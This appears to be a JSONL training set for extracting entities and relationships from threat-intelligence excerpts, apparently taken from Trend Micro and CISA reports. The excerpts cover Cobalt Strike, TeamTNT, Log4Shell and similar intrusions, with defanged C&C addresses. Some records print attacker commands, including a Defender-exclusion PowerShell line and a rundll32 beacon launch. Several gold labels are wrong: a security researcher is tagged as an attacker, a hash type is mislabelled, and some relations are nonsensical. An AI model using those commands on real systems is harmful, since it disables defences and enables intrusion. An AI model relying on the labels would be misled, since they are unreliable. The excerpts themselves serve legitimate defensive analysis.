{"instruction": "The file \"Winscp-setup-1867.exe\" is responsible for downloading the file \"Ebvjmba.dat\" by continuously sending a GET request to its server http[:]//79[.]137[.]203[.]156/Ebvjmba.dat. After executing Winscp-setup-1867.exe, a DLL file contacts the file server to download the DAT file dropper from 79[.]137[.]203[.]156, which is an IP address we determined to be the C&C server. The DLL file uses the .NET framework's \u201cHttpClient\u201d class to send an HTTP GET request to the specified asset URL. This dropper only has a Base64-encoded string of a binary code in reverse to evade detection.", "input": null, "output": "Named Entities: (http[:]//79[.]137[.]203[.]156/Ebvjmba.dat, URL), (79[.]137[.]203[.]156, IP), (C&C server, tool), (.NET framework's \u201cHttpClient\u201d class, tool)\nRelationships: (http[:]//79[.]137[.]203[.]156/Ebvjmba.dat, IP, 79[.]137[.]203[.]156)"}
{"instruction": "The attacks use a unique method of obtaining higher privileges to execute the payload. By default, there is a task in newer versions of Windows called CreateExplorerShellUnelevatedTask that prevents explorer.exe from running with elevated privileges. However, if explorer.exe is launched using the command line /NOUACCHECK, it inherits the elevated status from the parent process. In this case, the malicious actors injected the malicious activity into an existing svchost.exe, which serves as the parent process. The svchost.exe process then executes explorer.exe using the /NOUACCHECK command. Once this is done, explorer.exe can then be used to drop and execute the second stage Cobalt Strike beacon downloader. The second-stage downloader will then connect to the following address to download the main Cobalt Strike beacon: 195.123.234[.]101/DoFor/review/Mcirosoft", "input": null, "output": "Named Entities: (explorer.exe, file), (svchost.exe, file), (Cobalt Strike beacon, tool), (195.123.234[.]101/DoFor/review/Mcirosoft, IP)\nRelationships: (explorer.exe, launch, svchost.exe), (svchost.exe, execute, explorer.exe), (explorer.exe, drop and execute, Cobalt Strike beacon), (Cobalt Strike beacon, download, 195.123.234[.]101/DoFor/review/Mcirosoft)"}
{"instruction": "Command and Control (C&C) stage Earth Preta employed several tools and commands for the C&C stage. For example, the group used certutil.exe to download the legitimate WinRAR binary as rar1.exe from the server 103[.]159[.]132[.]91. We also observed that the threat actors used PowerShell to download multiple malware and archives from the server 103[.]159[.]132[.]181 for future use. In certain instances, they even leveraged the WinRAR binary installed on the victim hosts to decompress all the malware. Although we found several logs involving multiple pieces of dropped malware, we only managed to retrieve a few of them. Among all our collected samples, we will introduce the most noteworthy ones. Backdoor.Win32.CLEXEC The file name of the backdoor CLEXEC is SensorAware.dll. This is a simple backdoor that is capable of executing commands and clearing event logs. Backdoor.Win32.COOLCLIENT", "input": null, "output": "Named Entities: (Earth Preta, attacker), (certutil.exe, file), (WinRAR binary, tool), (rar1.exe, file), (103[.]159[.]132[.]91, IP), (PowerShell, tool), (103[.]159[.]132[.]181, IP), (Backdoor.Win32.CLEXEC, malware), (SensorAware.dll, file), (Backdoor.Win32.COOLCLIENT, malware)\nRelationships: (Earth Preta, use, certutil.exe), (certutil.exe, download, WinRAR binary), (WinRAR binary, download, rar1.exe), (Earth Preta, use, PowerShell), (PowerShell, download, malware and archives), (Earth Preta, leverage, WinRAR binary), (WinRAR binary, decompress, malware), (Backdoor.Win32.CLEXEC, file name, SensorAware.dll)"}
{"instruction": "Connecting the dots During our investigation, we observed some data points that connect to the same personnel. For example, we found a specific name \u201cTaoZongjie\u201d among the different malware samples we collected. In addition, the GitHub repository named \u201cYanNaingOo0072022,\u201d mentioned in Avast\u2019s December 2022 report, hosted multiple pieces of malware, including TONESHELL. We also observed that the obfuscation methods have similarities among the different malwares. User \u201cTaoZongjie\u201d We found some samples sharing the same special string/name \u201cTaoZongjie,\u201d including the Cobalt Strike malware, a Windows user on a TONESHELL C&C server, and the displayed message in the pop-up dialog box of TONESHELL. Our investigation started with the TONESHELL C&C server 38[.]54[.]33[.]228 that had the remote desktop service enabled. Here, we found that one of the Windows users was called \u201cTaoZongjie.\u201d", "input": null, "output": "Named Entities: (TaoZongjie, attacker), (TONESHELL, malware), (Cobalt Strike, malware), (38.54.33.228, IP)\nRelationships: (TaoZongjie, name, TaoZongjie), (TONESHELL, obfuscation method, Cobalt Strike), (TONESHELL, C&C server, 38.54.33.228), (38.54.33.228, Windows user, TaoZongjie)"}
{"instruction": "Which Trend Micro solutions can address this vulnerability? Trend Micro Malware Detection Patterns (VSAPI, Predictive Learning, Behavioral Monitoring and Web Reputation Service) for Endpoint, Servers, Mail, and Gateway (e.g., Apex One, Worry-Free Business Security Services, Worry-Free Business Security Standard/Advanced, Deep Security with anti-malware, etc.): Starting with Trend Micro Smart Scan Pattern version 21474.296.07, known exploits associated with this vulnerability are being detected as Trojan.Win32.CVE202323397. Trend Micro Vision One: Use this solution as an investigation tool. In the \u201cSearch App,\u201d select \u201cEndpoint Activity Data\u201d and enter the following query: - dpt: 445 AND eventSubId: 204 AND processCmd: *OUTLOOK*. This can be saved and added to a watchlist if desired. Cloud One Workload Security and Deep Security: IPS Rule 1009058, which will need to be changed to Prevent. TippingPoint Filters: 28471 SMB: SMBv1 Successful Protocol Negotiation 28472 SMB: SMBv2 Successful Protocol Negotiation", "input": null, "output": "Named Entities: (Trend Micro solutions, tool), (Trend Micro Malware Detection Patterns, tool), (Apex One, tool), (Worry-Free Business Security Services, tool), (Worry-Free Business Security Standard/Advanced, tool), (Deep Security with anti-malware, tool), (Trend Micro Vision One, tool), (Cloud One Workload Security, tool), (Deep Security, tool), (IPS Rule 1009058, tool), (TippingPoint Filters, tool), (Trojan.Win32.CVE202323397, threat type)\nRelationships: (Trend Micro Malware Detection Patterns, detect, Trojan.Win32.CVE202323397), (Trend Micro Vision One, use, investigation tool), (Cloud One Workload Security, use, IPS Rule 1009058), (Deep Security, use, IPS Rule 1009058)"}
{"instruction": "Using Trend Micro Vision One, we were able to observe the kind of information that RedLine Stealer collects, which include operating system, video controller, processor, antivirus, processes, and disk drive data via the Windows Management Instrumentation (WMI). The stolen data is sent to its C&C server, 77.73.134[.]13:12785. It is also capable of collecting data from browsers, cryptocurrency wallets, VPN applications, and other installed applications such as Discord. Security Scorecard published a detailed report about RedLine Stealer that includes a comprehensive list of data that this infostealer collects. We observed a marked difference in the RedLine Stealer samples they analyzed compared to ours \u2014 their malware samples created a BasicHttpBinding object that uses HTTP as the transport for sending SOAP messages to its C&C server, while the samples we obtained use NetTcpBinding for message delivery. The commands in our samples are also not named. Security recommendations and Trend Micro solutions", "input": null, "output": "Named Entities: (RedLine Stealer, malware), (Trend Micro Vision One, tool), (C&C server, tool), (77.73.134[.]13:12785, IP), (Security Scorecard, tool)\nRelationships: (RedLine Stealer, send to, C&C server)"}
{"instruction": "Local IP address and port used to send the request Current PID Kernel version and machine architecture Current file path Boolean (0 if it was launched with exactly one parameter, 1 otherwise) For the DNS C&C communication version, the malware retrieves the configured DNS server by reading the content of the /etc/resolv.conf file, or uses the DNS server operated by Google at IP address 8.8.8.8. In 2022, we already noticed that this threat actor was interested in platforms other than Windows, with the rshell malware family running on Linux and Mac OS. For these reasons, we would not be surprised to see SysUpdate samples for the Mac OS platform in the future. Interestingly, most of the Linux samples we found used the new DNS tunneling feature we detailed in Figure 2, while only one of the Windows\u2019 samples used it. Certificate compromise", "input": null, "output": "Named Entities: (8.8.8.8, IP), (rshell malware family, malware), (SysUpdate, malware)\nRelationships: No related relations."}
{"instruction": "Collects host information such as the hostname, IP Address and Mac address and sends it to its command-and-control (C&C) server 160[.]20[.]147[.]254 Creates a thread to continuously wait for C&C commands Decrypts C&C communication using the hardcoded key \u201cHappiness is a way station between too much and too little.\u201d Hardcoded Debug Info found in file: C:\\Users\\guss\\Desktop\\Recent Work\\UDP SHELL\\0.7 DLL\\UDPDLL\\Release\\UDPDLL.pdb", "input": null, "output": "Named Entities: (160[.]20[.]147[.]254, IP), (C:\\Users\\guss\\Desktop\\Recent Work\\UDP SHELL\\0.7 DLL\\UDPDLL\\Release\\UDPDLL.pdb, file)\nRelationships: No related relations."}
{"instruction": "Enigma uses two servers in its operation. The first utilizes Telegram for delivering payloads, sending commands, and receiving the payload heartbeat. The second server 193[.]56[.]146[.]29 is used for DevOps and logging purposes. At each stage the payload sends its execution log to the logging server. Since this malware is under continuous development the attacker potentially uses the logging server to improve malware performance. We have also identified the Amadey C2 panel on 193[.]56[.]146[.]29 which has only one sample (95b4de74daadf79f0e0eef7735ce80bc) communicating with it. Amadey is a popular botnet that is sold on Russian speaking forums, but its source code has been leaked online. Amadey offers threat actors polling and reconnaissance services. This server has a unique Linux distribution only referenced in Russian Linux forums. The default time zone on this server is set to Europe/Moscow. This server registers a newly infected host when Interview conditions.word.exe is executed by the victim.", "input": null, "output": "Named Entities: (Enigma, malware), (Telegram, tool), (193[.]56[.]146[.]29, IP), (Amadey, malware), (95b4de74daadf79f0e0eef7735ce80bc, SHA256), (Interview conditions.word.exe, file)\nRelationships: (Enigma, use, Telegram), (Enigma, use, 193[.]56[.]146[.]29), (Enigma, communicate with, Amadey), (Amadey, C2 panel, 193[.]56[.]146[.]29), (Amadey, communicate with, 95b4de74daadf79f0e0eef7735ce80bc), (193[.]56[.]146[.]29, register, Interview conditions.word.exe)"}
{"instruction": "Upon execution, the malware creates the mutual exclusion object (mutex) to mark its presence in the system and retrieves the MachineGuid of the infected system from the SOFTWARE\\Microsoft\\Cryptography\\MachineGuid registry key, which it uses as a unique identifier to register the system with its C&C server and track its infection. It then deletes the HKCU\\SOFTWARE\\Intel registry key and recreates it with two values, HWID and ID, as shown in Figure 13. It then collects information about the .NET Framework Setup on the infected system and sends it to its C&C server as shown in Figure 14. There are two C&C servers that were used in this attack chain. The first one ,193[.]56[.]146[.]29, is used to send program execution DEBUG and Telegram to deliver payloads and send commands.", "input": null, "output": "Named Entities: (malware, malware), (C&C server, tool), (C&C server, tool), (193[.]56[.]146[.]29, IP), (Telegram, tool)\nRelationships: (malware, send to, C&C server), (C&C server, used in, attack chain), (C&C server, deliver, Telegram)"}
{"instruction": "Post-Cobalt Strike infection We investigated the process memory dump of the msdtc.exe runtime that loads libvlc.dll with 1768.py, a tool to analyze Cobalt Strike beacons created by Didier Stevens. The result shows that C&C for this Cobalt Strike was 193[.]106[.]191[.]187 and spawns to dllhost.exe. Process injection We took a closer look at the processes, particularly dllhost.exe and wabmig.exe, and found that they were spawned from the abused VLC Media Player that became the host to malicious code execution through process injection and then became a beacon for Cobalt Strike and its subsequent activities. Abuse of legitimate tools Note that in addition to VLC Media player, which was introduced at the beginning of the second stage, both dllhost.exe and wabmig.exe, are legitimate files.", "input": null, "output": "Named Entities: (Cobalt Strike, malware), (msdtc.exe, file), (libvlc.dll, file), (1768.py, file), (Didier Stevens, attacker), (193.106.191.187, IP), (dllhost.exe, file), (wabmig.exe, file), (VLC Media Player, tool)\nRelationships: (Cobalt Strike, C&C, 193.106.191.187), (msdtc.exe, loads, libvlc.dll), (msdtc.exe, analyzed by, 1768.py), (1768.py, created by, Didier Stevens), (dllhost.exe, spawned from, VLC Media Player), (wabmig.exe, spawned from, VLC Media Player)"}
{"instruction": "In addition, we also spotted a link between the two campaigns: One of the C&C servers (98[.]142[.]251[.]29) can be correlated to a shortcut file. This shortcut file appears in one lure archive \u201cEU 31st session of the Commission on Crime Prevention and Criminal Justice United Nations on Drugs and Crime.rar\u201d (SHA256: 09fc8bf9e2980ebec1977a8023e8a2940e6adb5004f48d07ad34b71ebf35b877), which the Secureworks report also mentioned. We used the tool LECmd to parse the shortcut files wherein we found the specific C&C string inside the metadata of the .lnk file. It seems that the actor used the C&C string as the folder name. Third, the infection chains mentioned by Cisco Talos also resemble what we have observed recently: Both use schtasks and registry run key for persistence. Both use benign executables for DLL sideloading. Both use malicious archives for arrival vectors.", "input": null, "output": "Named Entities: (C&C server, tool), (98[.]142[.]251[.]29, IP), (EU 31st session of the Commission on Crime Prevention and Criminal Justice United Nations on Drugs and Crime.rar, file), (LECmd, tool)\nRelationships: No related relations."}
{"instruction": "Observed infection chain This section details the tools, tactics, and procedures (TTPs) used by the affiliate that infiltrated one of the targeted victims\u2019 environments, as observed from an incident response viewpoint. The ProxyShell (CVE-2021-34473, CVE-2021-34523, and CVE-2021-31207) and ProxyLogon (CVE-2021-26855 and CVE-2021-27065) vulnerabilities have been observed to be exploited by malicious actors to target government institutions. Similarly, the initial access portion of this attack began on the exchange servers in the targeted environment, when a web shell file was dropped in the public access folders in early September 2022 via ProxyShell exploitation. The attacker then executed a persistent malicious PowerShell code that was used to download and execute another PowerShell backdoor file in the server from the malicious IP address 185[.]82[.]219[.]201, as shown in Figure 7.", "input": null, "output": "Named Entities: (CVE-2021-34473, vulnerability), (CVE-2021-34523, vulnerability), (CVE-2021-31207, vulnerability), (CVE-2021-26855, vulnerability), (CVE-2021-27065, vulnerability), (185[.]82[.]219[.]201, IP)\nRelationships: No related relations."}
{"instruction": "The same IP address that hosted the malicious PowerShell code was also found serving a tunneling tool that we believe was used for data exfiltration. Based on our analysis of the Internet Information Services (IIS) access logs on the infected Exchange servers, the following IP addresses were exploiting the Proxyshell vulnerability during the same timeframe as the intrusion. 138[.]199[.]47[.]184 195[.]242[.]213[.]155 213[.]232[.]87[.]177 91[.]132[.]138[.]213 91[.]132[.]138[.]221 For the credential access and lateral movement phases, the attackers used Mimikatz to dump credentials, while NetScan and Advanced Port Scanner were used for discovery. Based on the event logs collected from one of the infected Exchange servers, there were many successful logins using compromised user accounts a day before the ransomware infection occurred on September 8, 2022.", "input": null, "output": "Named Entities: (malicious PowerShell code, tool), (tunneling tool, tool), (data exfiltration, threat type), (138[.]199[.]47[.]184, IP), (195[.]242[.]213[.]155, IP), (213[.]232[.]87[.]177, IP), (91[.]132[.]138[.]213, IP), (91[.]132[.]138[.]221, IP), (Mimikatz, tool), (NetScan, tool), (Advanced Port Scanner, tool), (ransomware infection, threat type)\nRelationships: (malicious PowerShell code, serve, tunneling tool), (tunneling tool, used for, data exfiltration)"}
{"instruction": "The Powershell backdoor\nThe PowerShell command executed after the Microsoft Exchange exploitation is responsible for downloading and executing another PowerShell script from the command-and-control (C&C) server 185[.]82[.]219[.]201. The downloaded PowerShell will be executed directly from memory to bypass detection.\nThis PowerShell backdoor was observed to be related to the SystemBC malware as a service. The script has a hard coded C&C server IP address and port number to connect to, with data passed to the \u201cRc4_crypt\u201d function before connection.\nWe found multiple variants from this backdoor on VirusTotal with different hardcoded C&C IP addresses and ports (this is included in IOCs section).", "input": null, "output": "Named Entities: (Powershell backdoor, malware), (PowerShell script, tool), (185[.]82[.]219[.]201, IP), (SystemBC malware, malware)\nRelationships: (Powershell backdoor, download, PowerShell script), (Powershell backdoor, related to, SystemBC malware), (PowerShell script, connect to, 185[.]82[.]219[.]201)"}
{"instruction": "Analysis of the samples in our honeypots revealed the following IP addresses establishing a connection to exposed Docker APIs over TCP that were previously documented to be involved in malicious activities: 115[.]238[.]146[.]136 150[.]158[.]33[.]66 101[.]42[.]100[.]251 113[.]57[.]111[.]119 139[.]59[.]132[.]89 120[.]48[.]86[.]143 58[.]192[.]31[.]232 121[.]36[.]16[.]103 1[.]116[.]151[.]108 27[.]128[.]160[.]170 124[.]222[.]213[.]175 We tracked the majority of these IP addresses to have established connections from China while one came from Germany, making a series of requests to the exposed Docker API as follows: 1. The initial request made was to get the Docker version information. As seen in the User-Agent header field, this request seems like TeamTNT is using the legitimate utility ZGrab to scan for publicly exposed Docker API servers. Go-developed ZGrab is a banner-grabbing tool that is currently being deprecated. A newer version called ZGrab2 is the open-source tool currently available in GitHub. We observed the older utility being used in the malicious sample we analyzed.", "input": null, "output": "Named Entities: (115[.]238[.]146[.]136, IP), (150[.]158[.]33[.]66, IP), (101[.]42[.]100[.]251, IP), (113[.]57[.]111[.]119, IP), (139[.]59[.]132[.]89, IP), (120[.]48[.]86[.]143, IP), (58[.]192[.]31[.]232, IP), (121[.]36[.]16[.]103, IP), (1[.]116[.]151[.]108, IP), (27[.]128[.]160[.]170, IP), (124[.]222[.]213[.]175, IP), (China, attacker), (Germany, attacker), (TeamTNT, attacker), (ZGrab, tool), (ZGrab2, tool)\nRelationships: (TeamTNT, use, ZGrab), (ZGrab, deprecated, ZGrab2)"}
{"instruction": "Once the request identifies the available servers, the routine moves to the next steps. 2. A ping request checks if the API server is live. 3. Once the ping response is positive, the attackers perform a request to deploy the /containers/create endpoint to deploy an alpine-based container with instructions to download and execute the malicious shell script. As you can see from the image above, the request shows the following steps being executed: a. Changes the root directory to /mnt b. Installs curl c. Creates the cron entry in crontab and /etc/cron.d to download the file cronb.sh from 205[.]185[.]118[.]246 4. Once the container deployment is successful, the attacker requests the Docker Daemon API to attach to the container and start it. The cronb.sh script", "input": null, "output": "Named Entities: (API server, tool), (alpine-based container, tool), (malicious shell script, tool), (205[.]185[.]118[.]246, IP)\nRelationships: (API server, deploy, alpine-based container), (alpine-based container, execute, malicious shell script), (malicious shell script, download from, 205[.]185[.]118[.]246)"}
{"instruction": "The threat actor also hijacks the various system binaries, creates custom processes, and renames them with a tnt prefix, or TNTcurl, curltnt, and tntrecht suffixes. In this function, the script also checks if the binaries tntcurl or curltnt exists or not, and adds their path as environment variables. This has also been documented previously and attributed to TeamTNT. c. ins_package: The ins_function function calls three functions after validating the package managers used in the operating system (OS) to install tools like gcc, make, and kmod to compile and install the source codes of rootkit and process hider code. d. SetupNameServers In this function, the script configures the network settings to use the IP addresses 8[.]8[.]8[.]8 and 8[.]8[.]4[.]4 as the domain name system (DNS) servers via updating /etc/resolv.conf file by changing the file permissions to make it mutable. The said addresses are Google DNS servers. e. download_f", "input": null, "output": "Named Entities: (threat actor, attacker), (TeamTNT, attacker), (gcc, tool), (make, tool), (kmod, tool), (8[.]8[.]8[.]8, IP), (8[.]8[.]4[.]4, IP), (/etc/resolv.conf, file)\nRelationships: No related relations."}
{"instruction": "The d.sh script has the least number of instructions among all the shell scripts used in this routine. This script uses the ZGrab scanner to scan for the available Docker API servers on both TCP ports 2375 (for unencrypted communication with the daemon) and 2376 (for encrypted communication with the daemon) in the network. It then deploys the Alpine Docker image via docker API. In the above Docker image deployment, d.sh adds a cron job to download and run cronb.sh from 205[.]185[.]118[.]246 and t.sh from the domain http[:]//kiss[.]a-dog[.]top/t[.]sh. This file also contains the TeamTNT\u2019s banner in a Base64-encoded string. Trend Micro solutions Trend Micro\u2122 Cloud One Workload Security\u2122 and Trend Micro Vision One\u2122 can detect these malicious activities and can be protected via these detections: Trend Micro Cloud OneTM Workload Security Tactics Techniques Procedure Detections Initial Access T1133 - External Remote Services", "input": null, "output": "Named Entities: (ZGrab scanner, tool), (Docker API, tool), (cronb.sh, file), (205[.]185[.]118[.]246, IP), (http[:]//kiss[.]a-dog[.]top/t[.]sh, URL), (TeamTNT, attacker), (Trend Micro\u2122 Cloud One Workload Security\u2122, tool), (Trend Micro Vision One\u2122, tool)\nRelationships: (d.sh script, use, ZGrab scanner), (d.sh script, use, Docker API), (d.sh script, add, cronb.sh), (cronb.sh, download from, 205[.]185[.]118[.]246)"}
{"instruction": "Brute Ratel drops Cobalt Strike Interestingly, the actors chose to leverage Cobalt Strike for lateral movement. The first of several beacon files are dropped onto the same infected endpoint running Brute Ratel C4, with the first being: C:\\Users\\Public\\Name-123456.xls This beacon file is executed on the same host running the Brute Ratel C4 using the following command: rundll32 C:\\users\\public\\Name-123456.xls,DllRegisterServer The actor drops the other beacon files and copies these to administrative shares on other hosts on the network, again using filenames bearing XLS attachments. C:\\Users\\Public\\abcabc.xls C:\\Users\\Public\\abc-1234.xls C:\\Users\\Public\\Orders_12_34_56.xls C:\\Users\\Public\\MkDir.xls The commands used to copy the files are as follows: C:\\WINDOWS\\system32\\cmd.exe /C copy C:\\users\\public\\fksro.xls \\\\<HOST>\\C$\\users\\public\\abcabc.xls The following list is the beacon C&C Servers: hxxps://fewifasoc[.]com | 45.153.242[.]251 hxxps://hadujaza[.]com | 45.153.241[.]88 hxxps://himiketiv[.]com | 45.153.241[.]64", "input": null, "output": "Named Entities: (Brute Ratel, malware), (Cobalt Strike, tool), (C:\\Users\\Public\\Name-123456.xls, file), (C:\\Users\\Public\\abcabc.xls, file), (C:\\Users\\Public\\abc-1234.xls, file), (C:\\Users\\Public\\Orders_12_34_56.xls, file), (C:\\Users\\Public\\MkDir.xls, file), (hxxps://fewifasoc[.]com, URL), (45.153.242[.]251, IP), (hxxps://hadujaza[.]com, URL), (45.153.241[.]88, IP), (hxxps://himiketiv[.]com, URL), (45.153.241[.]64, IP)\nRelationships: (Brute Ratel, drop, Cobalt Strike), (Brute Ratel, run, C:\\Users\\Public\\Name-123456.xls), (Brute Ratel, drop, C:\\Users\\Public\\abcabc.xls), (Brute Ratel, drop, C:\\Users\\Public\\abc-1234.xls), (Brute Ratel, drop, C:\\Users\\Public\\Orders_12_34_56.xls), (Brute Ratel, drop, C:\\Users\\Public\\MkDir.xls)"}
{"instruction": "Figure 1: CVE-2022-3199 Delivery Method for TruebotFollowing the successful download of the malicous file, Truebot renames itself and then loads FlawedGrace onto the host. Please see the FlawedGrace section below for more information on how this remote access tool (RAT) is used in Truebot operations. After deployment by Truebot, FlawedGrace is able to modify registry [T1112] and print spooler programs [T1547.012] that control the order that documents are loaded to a print queue. FlawedGrace manipulates these features to both escalate privilege and establish persistence. During FlawedGrace\u2019s execution phase, the RAT stores encrypted payloads [T1027.009] within the registry. The tool can create scheduled tasks and inject payloads into msiexec[.]exe and svchost[.]exe, which are command processes that enable FlawedGrace to establish a command and control (C2) connection to 92.118.36[.]199, for example, as well as load dynamic link libraries (DLLs) [T1055.001] to accomplish privilege escalation.", "input": null, "output": "Named Entities: (CVE-2022-3199, vulnerability), (Truebot, malware), (FlawedGrace, tool), (RAT, tool), (T1112, technique), (T1547.012, technique), (T1027.009, technique), (T1055.001, technique), (msiexec[.]exe, file), (svchost[.]exe, file), (92.118.36[.]199, IP)\nRelationships: (CVE-2022-3199, delivery method, Truebot), (Truebot, load, FlawedGrace), (FlawedGrace, used in, Truebot), (FlawedGrace, manipulate, T1055.001), (FlawedGrace, manipulate, T1055.001), (FlawedGrace, store, T1055.001), (FlawedGrace, establish, T1055.001), (FlawedGrace, establish, msiexec[.]exe), (FlawedGrace, establish, svchost[.]exe), (FlawedGrace, establish, 92.118.36[.]199)"}
{"instruction": "Note: The APT actors listed in this June 2023 update were observed leveraging virtual private servers (VPS) to route traffic to their target [T1583.003]. Due to the constant change incurred through use of different VPS infrastructures, the below timeline lists threat actor-controlled IPs that are likely only relevant for hunting during the specified narrow timeline of activity and are not recommended for blocking. Table 1: Timeline of Unattributed APT Actor Activity (CVE-2017-9248) Date Event Description 04/14/2023 Brute force attempts via dp_crypto.py APT actors used dp_crypto.py, a Python-based cryptographic script, to initiate and successfully execute [T1059.006] a brute force attack against the encryption key used by the Telerik UI for ASP.NET AJAX DialogHandler. This activity was associated with the malicious IP 20.121.51[.]51.", "input": null, "output": "Named Entities: (APT actors, attacker), (VPS, tool), (dp_crypto.py, file), (20.121.51[.]51, IP)\nRelationships: (APT actors, leverage, VPS), (APT actors, use, dp_crypto.py), (dp_crypto.py, execute, brute force attack), (dp_crypto.py, associated with, 20.121.51[.]51)"}
{"instruction": "Note: Document Manager provides an interface for users to manage documents, such as uploading, downloading, editing, deleting, or organizing files. APT actors manipulated the Document Manager to upload malicious scripts, download and delete sensitive files, and make unauthorized modifications [T1105]. In more sophisticated attacks, cyber threat actors may use this access as means for lateral movement into an organization\u2019s network. 04/14/2023 Done.html uploaded to IIS server APT actors uploaded Done.html to the IIS server as means for confirming successful CVE-2017-9248 exploitation and file upload capabilities. Note: This file was not identified as malicious. 04/14/2023 sd.php and osker.aspx webshells uploaded to IIS server APT actors uploaded malicious webshells [T1505.003] (sd.php, osker.aspx) for backdoor access and remote control. osker.aspx was accessed via malicious IP 207.244.71[.]81 until 04/15/2023, likely to maintain persistence or conduct further operations that were not identified during analysis. 04/14/2023 App_Web_jl37rjxu.dll created on IIS server", "input": null, "output": "Named Entities: (Document Manager, tool), (APT actors, attacker), (Done.html, file), (CVE-2017-9248, vulnerability), (sd.php, file), (osker.aspx, file), (207.244.71[.]81, IP), (App_Web_jl37rjxu.dll, file)\nRelationships: (Document Manager, manipulated by, APT actors), (APT actors, upload, Done.html), (Done.html, confirm successful exploitation, CVE-2017-9248), (APT actors, upload, sd.php), (APT actors, upload, osker.aspx), (osker.aspx, accessed via, 207.244.71[.]81)"}
{"instruction": "APT actors created App_Web_jl37rjxu.dll on the IIS server, which indicated code was successfully compiling or running. 04/15/2023 fassdfsdf.html uploaded to IIS server APT actors uploaded fassdfsdf.html to the IIS server. This was likely used as a test file to validate successful file transfer. 04/17/2023 osker.aspx webshell accessed from different IP APT actors accessed the osker.aspx webshell via malicious IP 162.210.194[.]10. CISA and authoring organizations were unable to identify privilege escalation, lateral movement, or data exfiltration. However, the presence of webshells and file uploads indicated APT actors maintained access and had the potential to conduct additional malicious activity. For more information on the identified malicious files from Table 1, see MAR-10443863-1.v1 CVE-2017-9248 Exploitation in U.S. Government IIS Server. Update End", "input": null, "output": "Named Entities: (APT actors, attacker), (App_Web_jl37rjxu.dll, file), (fassdfsdf.html, file), (osker.aspx, file), (162.210.194[.]10, IP)\nRelationships: (APT actors, create, App_Web_jl37rjxu.dll), (APT actors, upload, fassdfsdf.html), (APT actors, access, osker.aspx), (APT actors, access from, 162.210.194[.]10), (APT actors, maintain access, webshells)"}
{"instruction": "Create one of the DLL files (C:\\Windows\\Temp\\1665890187.8690152.dll) by process w3wp.exe PID 6484. Load the newly created DLL into a currently running IIS process, w3wp.exe PID 6484. Make a TCP connection using w3wp.exe PID 6484 to 45.77.212[.]12 over port 443. Invoke C:\\Windows\\System32\\vcruntime140.dll (Windows C runtime library) to execute payload. Steps 1 and 2 occur every time a malicious DLL file is created. In some cases, an ASP .NET temp file was created, but this may have indicated benign IIS server activity. Note: The Process ID (PID) used in this example is unique to this investigation and is not universal. IP address 45.77.212[.]12 correlates to TA1, but the pattern can be used as general practice to identify similar activity. Additional Searching for IIS Servers", "input": null, "output": "Named Entities: (C:\\Windows\\Temp\\1665890187.8690152.dll, file), (45.77.212[.]12, IP), (vcruntime140.dll, file), (Windows C runtime library, tool), (IIS server, tool), (TA1, attacker)\nRelationships: No related relations."}
{"instruction": "Based on trusted third-party reporting, 51.89.181[.]64 is a Lightweight Directory Access Protocol (LDAP) server associated with threat actors exploiting Log4Shell. Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address. CISA also observed a DNS query for us\u2010nation\u2010ny[.]cf that resolved back to 51.89.181[.]64 when the victim server was returning this Log4Shell LDAP callback to the actors\u2019 server. CISA assessed that this traffic indicated a confirmed compromise based on the successful callback to the indicator and informed the organization of these findings; the organization investigated the activity and found signs of compromise. As trusted-third party reporting associated Log4Shell activity from 51.89.181[.]64 with lateral movement and targeting of DCs, CISA suspected the threat actors had moved laterally and compromised the organization\u2019s DC.", "input": null, "output": "Named Entities: (51.89.181[.]64, IP), (Lightweight Directory Access Protocol (LDAP) server, tool)\nRelationships: No related relations."}
{"instruction": "From mid-June through mid-July 2022, CISA conducted an onsite incident response engagement and determined that the organization was compromised as early as February 2022, by likely Iranian government-sponsored APT actors who installed XMRig crypto mining software. The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies. Threat Actor Activity In February 2022, the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organization\u2019s unpatched VMware Horizon server. As part of their initial exploitation, CISA observed a connection to known malicious IP address 182.54.217[.]2 lasting 17.6 seconds. The actors\u2019 exploit payload ran the following PowerShell command [T1059.001] that added an exclusion rule to Windows Defender [T1562.001]: powershell try{Add-MpPreference -ExclusionPath 'C:\\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc \"$BASE64 encoded payload to download next stage and execute it\"", "input": null, "output": "Named Entities: (Iranian government-sponsored APT actors, attacker), (XMRig crypto mining software, malware), (Ngrok reverse proxies, tool), (182.54.217[.]2, IP)\nRelationships: (Iranian government-sponsored APT actors, installed, XMRig crypto mining software), (Iranian government-sponsored APT actors, implanted, Ngrok reverse proxies), (Iranian government-sponsored APT actors, connected to, 182.54.217[.]2)"}
{"instruction": "The exclusion rule allowlisted the entire c:\\drive, enabling threat actors to download tools to the c:\\drive without virus scans. The exploit payload then downloaded mdeploy.text from 182.54.217[.]2/mdepoy.txt to C:\\users\\public\\mde.ps1 [T1105]. When executed, mde.ps1 downloaded file.zip from 182.54.217[.]2 and removed mde.ps1 from the disk [T1070.004]. file.zip contained XMRig cryptocurrency mining software and associated configuration files. WinRing0x64.sys \u2013 XMRig Miner driver wuacltservice.exe \u2013 XMRig Miner config.json \u2013 XMRig miner configuration RuntimeBroker.exe \u2013 Associated file. This file can create a local user account [T1136.001] and tests for internet connectivity by pinging 8.8.8.8 [T1016.001]. The exploit payload created a Scheduled Task [T1053.005] that executed RuntimeBroker.exe daily as SYSTEM. Note: By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access. The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task. See MAR 10387061-1.v1 for additional information, including IOCs, on these four files.", "input": null, "output": "Named Entities: (tools, tool), (C:\\users\\public\\mde.ps1, file), (file.zip, file), (XMRig cryptocurrency mining software, tool), (WinRing0x64.sys, file), (wuacltservice.exe, file), (config.json, file), (RuntimeBroker.exe, file), (8.8.8.8, IP), (RuntimeBrokerService.exe, file), (MAR 10387061-1.v1, file)\nRelationships: (C:\\users\\public\\mde.ps1, download, file.zip), (file.zip, contain, XMRig cryptocurrency mining software), (file.zip, contain, config.json), (file.zip, contain, WinRing0x64.sys), (file.zip, contain, wuacltservice.exe), (file.zip, contain, RuntimeBroker.exe), (RuntimeBroker.exe, test, 8.8.8.8)"}
